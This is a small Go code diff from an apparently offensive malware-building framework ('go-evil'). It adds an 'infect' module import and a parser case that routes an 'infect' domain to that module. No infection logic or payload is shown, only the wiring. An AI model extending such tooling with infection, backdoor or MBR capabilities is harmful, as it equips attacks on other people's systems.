@@ -6,6 +6,7 @@ import (
 
 	attack_vector "github.com/s9rA16Bf4/go-evil/domains/attack_vector"
 	"github.com/s9rA16Bf4/go-evil/domains/backdoor"
+	"github.com/s9rA16Bf4/go-evil/domains/infect"
 	"github.com/s9rA16Bf4/go-evil/domains/keyboard"
 	"github.com/s9rA16Bf4/go-evil/domains/malware"
 	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
@@ -110,6 +111,9 @@ func Parser(file string) {
 		case "mbr":
 			io.Append_domain("mbr")
 			mbr.Parse(funct[0])
+		case "infect":
+			io.Append_domain("infect")
+			infect.Parse(funct[0])
 
 		default:
 			notify.Error("Unknwon top level domain '"+funct[1]+"'", "parser.Parse()")
